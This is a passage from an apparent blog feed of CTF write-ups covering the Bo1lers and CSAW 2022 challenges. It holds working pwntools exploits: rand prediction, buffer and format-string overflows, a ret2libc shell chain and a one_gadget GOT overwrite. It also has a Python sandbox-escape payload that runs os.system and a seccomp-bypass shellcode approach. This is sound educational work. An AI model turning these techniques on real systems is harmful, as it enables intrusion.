class="string">b&quot;9$s&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">5</span>+exe.got[<span class="string">&quot;exit&quot;</span>].to_bytes(<span class="number">8</span>,<span class="string">&quot;little&quot;</span>)[:-<span class="number">2</span>:])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;data: &quot;</span>,(libc.address+one_gadget).to_bytes(<span class="number">8</span>,<span class="string">&quot;little&quot;</span>)[:-<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>ASIS{fd408e00d5824d7220c4d624f894144e}</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] gambler-baby [Bo1lers CTF 2022]</title>
    <url>/ctf-writeup/2022/bo1lers/pwn/gambler-baby/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Feeling lucky?</p>
<p>You must create a flag.txt in the same folder as the binary for it to run.<br>nc ctf.b01lers.com 9202</p>
<p>Author: robotearthpizza<br>Difficulty: Easy</p>
<p>files: <a href="gambler_baby">gambler_baby</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>function <code>sym.casino</code> ask for a 4 byte string using <code>fgets</code>, then it compare with a random string generate by <code>sym.imp.rand()</code>. </p>
<p>If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    do &#123;</span><br><span class="line">        // generate random string</span><br><span class="line">        sym.imp.fgets(&amp;s2, 5, _reloc.stdin);</span><br><span class="line">        iVar1 = sym.imp.strcmp(&amp;s1);</span><br><span class="line">        // add or subtract balance depend on the result</span><br><span class="line">    &#125; while (_obj.balance &lt; 1000);</span><br><span class="line">    sym.give_flag();</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The vulnerability here is that the binary never set random seed using <code>srand</code>, therefore, the sequence <code>rand()</code> give us will always be the same.</p>
<p>we can use following code to generate string and send string to the server</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main () &#123;</span><br><span class="line">    char s[5];</span><br><span class="line">    s[4] = &#x27;\x0&#x27;;</span><br><span class="line">    for (int j=0;j&lt;200;j++) &#123;</span><br><span class="line">        for (int i=0;i&lt;4;i++) &#123;</span><br><span class="line">            int x = rand();</span><br><span class="line">            s[i] = x + (x / 0x1a) * -(0x1a) + &#x27;a&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;\&quot;%s\&quot;,&quot;,s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">values = [&quot;nwlr&quot;,&quot;bbmq&quot;,&quot;bhcd&quot;,&quot;arzo&quot;,&quot;wkky&quot;,&quot;hidd&quot;,&quot;qscd&quot;,&quot;xrjm&quot;,&quot;owfr&quot;,&quot;xsjy&quot;,&quot;bldb&quot;,&quot;efsa&quot;,&quot;rcby&quot;,&quot;necd&quot;,&quot;yggx&quot;,&quot;xpkl&quot;,&quot;orel&quot;,&quot;lnmp&quot;,&quot;apqf&quot;,&quot;wkho&quot;,&quot;pkmc&quot;,&quot;oqhn&quot;,&quot;wnku&quot;,&quot;ewhs&quot;,&quot;qmgb&quot;,&quot;buqc&quot;,&quot;ljji&quot;,&quot;vswm&quot;,&quot;dkqt&quot;,&quot;bxix&quot;,&quot;mvtr&quot;,&quot;rblj&quot;,&quot;ptns&quot;,&quot;nfwz&quot;,&quot;qfjm&quot;,&quot;afad&quot;,&quot;rrws&quot;,&quot;ofsb&quot;,&quot;cnuv&quot;,&quot;qhff&quot;,&quot;bsaq&quot;,&quot;xwpq&quot;,&quot;cace&quot;,&quot;hchz&quot;,&quot;vfrk&quot;,&quot;mlno&quot;,&quot;zjkp&quot;,&quot;qpxr&quot;,&quot;jxki&quot;,&quot;tzyx&quot;,&quot;acbh&quot;,&quot;hkic&quot;,&quot;qcoe&quot;,&quot;ndto&quot;,&quot;mfgd&quot;,&quot;wdwf&quot;,&quot;cgpx&quot;,&quot;iqvk&quot;,&quot;uytd&quot;,&quot;lcgd&quot;,&quot;ewht&quot;,&quot;acio&quot;,&quot;hord&quot;,&quot;tqkv&quot;,&quot;wcsg&quot;,&quot;spqo&quot;,&quot;qmsb&quot;,&quot;oagu&quot;,&quot;wnny&quot;,&quot;qxnz&quot;,&quot;lgdg&quot;,&quot;wpbt&quot;,&quot;rwbl&quot;,&quot;nsad&quot;,&quot;eugu&quot;,&quot;umoq&quot;,&quot;cdru&quot;,&quot;beto&quot;,&quot;kyxh&quot;,&quot;oach&quot;,&quot;wdvm&quot;,&quot;xxrd&quot;,&quot;ryxl&quot;,&quot;mndq&quot;,&quot;tukw&quot;,&quot;agml&quot;,&quot;ejuu&quot;,&quot;kwci&quot;,&quot;bxub&quot;,&quot;umen&quot;,&quot;meya&quot;,&quot;tdrm&quot;,&quot;ydia&quot;,&quot;jxlo&quot;,&quot;ghiq&quot;,&quot;fmzh&quot;,&quot;lvih&quot;,&quot;jouv&quot;,&quot;suyo&quot;,&quot;ypay&quot;,&quot;ulye&quot;,&quot;imuo&quot;,&quot;tehz&quot;,&quot;riic&quot;,&quot;fskp&quot;,&quot;ggkb&quot;,&quot;bipz&quot;,&quot;zrzu&quot;,&quot;cxam&quot;,&quot;ludf&quot;,&quot;ykgr&quot;,&quot;uowz&quot;,&quot;gioo&quot;,&quot;obpp&quot;,&quot;leql&quot;,&quot;wpha&quot;,&quot;pjna&quot;,&quot;dqhd&quot;,&quot;cnvw&quot;,&quot;dtxj&quot;,&quot;bmyp&quot;,&quot;ppha&quot;,&quot;uxns&quot;,&quot;pusg&quot;,&quot;dhii&quot;,&quot;xqmb&quot;,&quot;fjxj&quot;,&quot;cvud&quot;,&quot;jsuy&quot;,&quot;ibye&quot;,&quot;bmws&quot;,&quot;iqyo&quot;,&quot;ygyx&quot;,&quot;ymze&quot;,&quot;vypz&quot;,&quot;vjeg&quot;,&quot;ebeo&quot;,&quot;cfuf&quot;,&quot;tsxd&quot;,&quot;ixti&quot;,&quot;gsie&quot;,&quot;ehkc&quot;,&quot;hzdf&quot;,&quot;lilr&quot;,&quot;jqfn&quot;,&quot;xztq&quot;,&quot;rsvb&quot;,&quot;spky&quot;,&quot;hsen&quot;,&quot;bppk&quot;,&quot;qtpd&quot;,&quot;dbuo&quot;,&quot;tbbq&quot;,&quot;cwiv&quot;,&quot;rfxj&quot;,&quot;ujjd&quot;,&quot;dntg&quot;,&quot;eiqv&quot;,&quot;dgai&quot;,&quot;jvwc&quot;,&quot;yaub&quot;,&quot;wewp&quot;,&quot;jvyg&quot;,&quot;ehlj&quot;,&quot;xepb&quot;]</span><br><span class="line"></span><br><span class="line">io = connect(&quot;ctf.b01lers.com&quot;, 9202)</span><br><span class="line">i = 0</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        lp(io.sendlineafter(b&quot;letters: &quot;,values[i].encode()))</span><br><span class="line">        i+=1</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>forgot</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] gambler-overflow [Bo1lers CTF 2022]</title>
    <url>/ctf-writeup/2022/bo1lers/pwn/gambler-overflow/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Feeling luuuuuuuucky?</p>
<p>You must create a flag.txt in the same folder as the binary for it to run.<br>nc ctf.b01lers.com 9203</p>
<p>Author: robotearthpizza<br>Difficulty: Easy</p>
<p>files: <a href="gambler_overflow">gambler_overflow</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>function <code>sym.casino</code> ask for a 4 byte string using <code>gets</code>, then it compare with a random string generate by <code>sym.imp.rand()</code>. </p>
<p>If we enter the same string as the random one, we get certain amount of money. If we have more than 1000 in balance, the program will print out the flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│           ; var signed int64_t var_1ch @ rbp-0x1c</span><br><span class="line">│           ; var char *s2 @ rbp-0x18</span><br><span class="line">│           ; var char *s1 @ rbp-0x10</span><br><span class="line">│           ; var int64_t canary @ rbp-0x8</span><br><span class="line">&#123;</span><br><span class="line">    do &#123;</span><br><span class="line">        // generate random string</span><br><span class="line">        sym.imp.gets(&amp;s2);</span><br><span class="line">        iVar1 = sym.imp.strcmp(&amp;s1);</span><br><span class="line">        // add or subtract balance depend on the result</span><br><span class="line">    &#125; while (_obj.balance &lt; 1000);</span><br><span class="line">    sym.give_flag();</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>it uses <code>gets</code>, so we can overwrite s1 by s2. so that we can make s2 and s1 same.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        lp(io.sendlineafter(b&quot;letters: &quot;,b&quot;AAAAAAA\x00AAAAAAA\x00&quot;))</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>forgot</p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] gambler-supreme [Bo1lers CTF 2022]</title>
    <url>/ctf-writeup/2022/bo1lers/pwn/gambler-supreme/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>gambler_supreme 50 PointsSOLVED<br>The Casino, but with a cool new feature!</p>
<p>You must create a flag.txt in the same folder as the binary for it to run.<br>nc ctf.b01lers.com 9201</p>
<p>Author: robotearthpizza<br>Difficulty: Hard</p>
<p>files: <a href="gambler_supreme">gambler_supreme</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>it marks as hard but actually very easy.</p>
<p>function <code>sym.casino</code> ask for a 4 byte string using <code>gets</code>, then it compare with a random string generate by <code>sym.imp.rand()</code>. In this challenge, the function for print out flag is not called in binary. So we need to control rip and jump to the function.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">│           ; var signed int64_t var_34h @ rbp-0x34</span><br><span class="line">│           ; var char *format @ rbp-0x30</span><br><span class="line">│           ; var char *s1 @ rbp-0x20</span><br><span class="line">│           ; var int64_t canary @ rbp-0x8</span><br><span class="line">&#123;</span><br><span class="line">    do &#123;</span><br><span class="line">        // generate random string</span><br><span class="line">        sym.imp.gets(&amp;format);</span><br><span class="line">        sym.imp.printf(&quot;Your guess: &quot;);</span><br><span class="line">        sym.imp.printf(&amp;format);</span><br><span class="line">        sym.imp.putchar(10);</span><br><span class="line">        sym.imp.printf(&quot;Correct word: %s\n&quot;, &amp;s1);</span><br><span class="line">        iVar1 = sym.imp.strcmp(&amp;s1);</span><br><span class="line">        // add or subtract balance depend on the result</span><br><span class="line">    &#125; while (_obj.balance &lt; 1000);</span><br><span class="line">    sym.imp.printf(&quot;Drats, the cat snuck in and deleted the code for give_flag...&quot;);</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It have both <code>gets</code> to overwrite and <code>printf</code> to leak data.</p>
<p>using printf, we can leak canary. </p>
<p>then if we overwrite rip to <code>give_flag</code> using <code>gets</code>,  the flag when be print when function return.</p>
<p>finally we uses <code>gets</code> again, overwrite <code>s1</code>,  make <code>format</code> and <code>s1</code> same. </p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&quot;(inclusive):&quot;,b&quot;1&quot;)</span><br><span class="line">io.sendlineafter(b&quot;letters: &quot;,b&quot;%13$p&quot;)</span><br><span class="line">lp(io.recvuntil(b&quot;Your guess: &quot;))</span><br><span class="line">canary = int(io.recvuntil(b&quot;\n&quot;,drop=True),16)</span><br><span class="line">lp(&quot;canary&quot;,hex(canary))</span><br><span class="line">io.sendlineafter(b&quot;letters: &quot;,flat(&#123;</span><br><span class="line">    0x30 - 0x8:canary,</span><br><span class="line">    0x30 + 0x8: exe.sym[&quot;give_flag&quot;]</span><br><span class="line">&#125;))</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">        lp(io.sendlineafter(b&quot;letters: &quot;,b&quot;AAAAAAA\x00AAAAAAA\x00&quot;))</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p>forgot</p>
]]></content>
  </entry>
  <entry>
    <title>[Rev] MeMbrEy0 LEaK [CSAW CTF 2022 Final]</title>
    <url>/ctf-writeup/2022/csawfinal/misc/MeMbrEy0_LEaK/index.html</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>file <a href="./src/service.py">service.py</a></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>todo</p>
]]></content>
  </entry>
  <entry>
    <title>[Rev] SupEr GUeSsEr G@me [CSAW CTF 2022 Final]</title>
    <url>/ctf-writeup/2022/csawfinal/misc/SupEr_GUeSsEr_Game/index.html</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>file <a href="./src/service.py">service.py</a></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><p>todo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">[setattr([obj for obj in [x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;BuiltinImporter&#x27;][0]().load_module(&#x27;gc&#x27;).get_objects() if (&#x27;__name__&#x27; in dir(obj)) and (&#x27;__main__&#x27; in obj.__name__)][0].__builtins__,&#x27;set&#x27;,lambda x:[]),setattr([obj for obj in [x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;BuiltinImporter&#x27;][0]().load_module(&#x27;gc&#x27;).get_objects() if (&#x27;__name__&#x27; in dir(obj)) and (&#x27;__main__&#x27; in obj.__name__)][0].__builtins__,&#x27;print&#x27;,lambda y:[x for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__ == &#x27;BuiltinImporter&#x27;][0]().load_module(&#x27;os&#x27;).system(&#x27;ls&#x27;))]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>[Rev] cube [CSAW CTF 2022 Final]</title>
    <url>/ctf-writeup/2022/csawfinal/rev/cube/index.html</url>
    <content><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>file: <a href="./src/cube">cube</a></p>
<h1 id="Todo"><a href="#Todo" class="headerlink" title="Todo"></a>Todo</h1>]]></content>
  </entry>
  <entry>
    <title>[Pwn] ezROP [CSAW CTF Qual 2022]</title>
    <url>/ctf-writeup/2022/csawqual/pwn/ezROP/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>This is a simple buffer overflow challenge, but I wrote it in a reversed way :)</p>
<p>nc pwn.chal.csaw.io 5002</p>
<p>Files: <a href="share.zip">share.zip</a></p>
<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>We have a 0x9c byte buffer overflow in <code>vuln()</code>. </p>
<p>With no PIE and noe canary, we have direct control to RIP. </p>
<p>Therefore, make a ROP chain to leak libc address, then perform a ret2libc to get a shell.</p>
<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;ezROP&quot;</span>)</span><br><span class="line">exe_rop = ROP(exe)</span><br><span class="line"><span class="comment"># libc = ELF(&quot;libc6_2.31-0ubuntu9.7_amd64.so&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc6_2.31-0ubuntu9.9_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ld = ELF(&quot;./ld-2.27.so&quot;)</span></span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line">lp = log_print</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;pwn.chal.csaw.io&quot;</span>, <span class="number">5002</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">ret_addr = exe_rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004015a3</span></span><br><span class="line">pop_rsi_r14_ret_addr = <span class="number">0x00000000004015a1</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line">io.sendafter(<span class="string">b&quot;name?\n&quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">b&#x27;\n&#x27;</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="string">b&#x27;AAAAAAAA&#x27;</span>,</span><br><span class="line">    <span class="number">0x70</span>+<span class="number">0x8</span>: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        exe.got[<span class="string">&quot;printf&quot;</span>],</span><br><span class="line">        exe.plt[<span class="string">&quot;printf&quot;</span>],</span><br><span class="line">        ret_addr,</span><br><span class="line">        exe.sym[<span class="string">&quot;main&quot;</span>]</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;22!\n&quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>.from_bytes(io.recvuntil(<span class="string">b&quot;My&quot;</span>,drop=<span class="literal">True</span>),<span class="string">&quot;little&quot;</span>) - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">io.sendafter(<span class="string">b&quot;name?\n&quot;</span>,flat(&#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">b&#x27;\n&#x27;</span>,</span><br><span class="line">    <span class="number">8</span>: <span class="string">b&#x27;AAAAAAAA&#x27;</span>,</span><br><span class="line">    <span class="number">0x70</span>+<span class="number">0x8</span>: [</span><br><span class="line">        ret_addr,</span><br><span class="line">        pop_rdi_ret_addr,</span><br><span class="line">        <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>)),</span><br><span class="line">        libc.sym[<span class="string">&quot;system&quot;</span>],</span><br><span class="line">    ]</span><br><span class="line">&#125;))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p><code>flag&#123;53bb4218b851affb894fad151652dc333a024990454a0ee32921509a33ebbeb4&#125;</code></p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] how2pwn [CSAW CTF Qual 2022]</title>
    <url>/ctf-writeup/2022/csawqual/pwn/how2pwn/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>how2pwn is a series of beginner-friendly pwn challenges to make pwning and shellcoding more approachable.</p>
<p>Servers:</p>
<p>nc how2pwn.chal.csaw.io 60001</p>
<p>nc how2pwn.chal.csaw.io 60002</p>
<p>nc how2pwn.chal.csaw.io 60003</p>
<p>nc how2pwn.chal.csaw.io 60004</p>
<p>Files: <a href="public.zip">public.zip</a></p>
<h1 id="0x2-Vuln-Exploits"><a href="#0x2-Vuln-Exploits" class="headerlink" title="0x2 Vuln &amp; Exploits"></a>0x2 Vuln &amp; Exploits</h1><p>Each step have restriction in some way.</p>
<p>Each step require you to write a shellcode that print out the flag.</p>
<h2 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h2><p>no restriction, just send a <code>execve(&#39;/bin/sh&#39;)</code> shellcode to get a shell and get the flag</p>
<p>exploit: <a href="chal1.py">exploit-1.py</a></p>
<h2 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h2><p>only allow 0x10 bytes shellcode.</p>
<p>solution is pretty simple, since it calls <code>read(0, buf, 0x10)</code>. And <code>rsi</code> hasn&#39;t change since that read call.</p>
<p>we can craft a shellcode that call <code>read</code> again and allow us to read more bytes into the memory. </p>
<p>Therefore, we got enough space for the get shell payload.</p>
<p>exploit: <a href="chal2.py">exploit-2.py</a></p>
<h2 id="Step3"><a href="#Step3" class="headerlink" title="Step3"></a>Step3</h2><p>binary uses seccomp to block most of syscall. However, it doesn&#39;t block syscall in x86.</p>
<p>therefore, we can use <code>retf</code> return to x86 shellcode, use x86 shellcode to bypass the restriction and get the flag</p>
<p>use the hint you get from step2, you can craft the payload pretty easily</p>
<p><strong>hint from step2</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span><br><span class="line"># 1. In this challenge, you can&#x27;t open a file because of the strict sandbox</span><br><span class="line"># 2. But there is a vul about the sanbox, it doesn&#x27;t check the syscall arch.</span><br><span class="line"># 3. We can use x86 syscalls to bypass it. All x86 syscalls: https://syscalls32.paolostivanin.com/</span><br><span class="line"># 4. You may find x86 can&#x27;t visite x64 address because x64 address is too long to be stored in the x86 register. However, we still have syscall_mmap, which could allocate a chunk of memory, for example 0xcafe000, so we can visite this address in x86 mode.</span><br><span class="line"># 5. There is a demo for retf: https://github.com/n132/n132.github.io/blob/master/code/GoogleCTF/S2/XxX/pwn.S</span><br></pre></td></tr></table></figure>

<p>exploit: <a href="chal3.py">exploit-3.py</a></p>
<h2 id="Step4"><a href="#Step4" class="headerlink" title="Step4"></a>Step4</h2><p>a <code>copied</code> version of <a href="https://n132.github.io/2022/07/04/S2.html">https://n132.github.io/2022/07/04/S2.html</a></p>
<p>The program have a sandbox that only allows __NR_seccomp __NR_fork __NR_ioctl __NR_exit</p>
<p>simple version of the solution</p>
<ol>
<li>create a listener using seccomp</li>
<li>in the child process, listen to all the syscall. And change the syscall status from denied to allow whenever a syscall is called by user</li>
<li>in the parent process, wait until child process started.  ret to x86 and print out the flag using shellcode.</li>
</ol>
<p>rewrite the exploit in <a href="https://github.com/n132/n132.github.io/blob/master/code/GoogleCTF/S2/XxX/exp.cc">exp.cc</a> asm and get the shell</p>
<p>exploits: <a href="chal4struct.c">chal4struct.c</a> (for getting the value that will be used in shellcode), <a href="chal4.py">exploit-4.py</a></p>
<h1 id="0x4-Flag"><a href="#0x4-Flag" class="headerlink" title="0x4 Flag"></a>0x4 Flag</h1><p><code>flag&#123;8d13cfa357978684be9809172d3033ce739015f5&#125;</code></p>
]]></content>
  </entry>
  <entry>
    <title>[Web] World Wide Web [CSAW CTF Qual 2022]</title>
    <url>/ctf-writeup/2022/csawqual/web/world-wide-web/index.html</url>
    <content><![CDATA[<h1 id="0x0-Introduction"><a href="#0x0-Introduction" class="headerlink" title="0x0 Introduction"></a>0x0 Introduction</h1><p>Isn&#39;t the Word Wide Web a fascinating place to be in? Words.. so many words.. all linked... NOTE: The flag doesn&#39;t have a wrapper. It needs to be wrapped with curly brackets and please put CTF in front of the curly brackets.</p>
<p><a href="http://web.chal.csaw.io:5010/">http://web.chal.csaw.io:5010</a></p>
<h1 id="0x1-Walk-Through"><a href="#0x1-Walk-Through" class="headerlink" title="0x1 Walk Through"></a>0x1 Walk Through</h1><p>looking at the web request</p>
<p>we have a cookie <code>solChain=stuff%20center%20function</code> which contains all the url we have visited</p>
<p>write a script, start with <code>/stuff</code>, find next link in web page, visist that link with current cookie.</p>
<p>util we get a flag</p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">find_reg = re.compile(r&#x27;&lt;a href=\&quot;([^\&quot;]*)\&quot;&gt;&#x27;)</span><br><span class="line">print(find_reg.findall(&#x27;&lt;a href=&quot;/audience&quot;&gt;audience&lt;/a&gt;&#x27;))</span><br><span class="line">base_addr = &quot;http://web.chal.csaw.io:5010&quot;</span><br><span class="line"></span><br><span class="line">next_path = &quot;/stuff&quot;</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    resp = s.get(base_addr+next_path)</span><br><span class="line">    ps = find_reg.findall(resp.text)</span><br><span class="line">    print(ps,s.headers)</span><br><span class="line">    if len(ps) &lt; 1:</span><br><span class="line">        print(resp.text)</span><br><span class="line">        break</span><br><span class="line">    next_path = ps[0]</span><br></pre></td></tr></table></figure>

<h1 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h1><p><code>CTF&#123;w0rdS_4R3_4mAz1nG_r1ght&#125;</code></p>
]]></content>
  </entry>
  <entry>
    <title>[Pwn] Reading List [Nahamcon CTF 2022]</title>
    <url>/ctf-writeup/2022/nahamcon/pwn/reading_list/index.html</url>
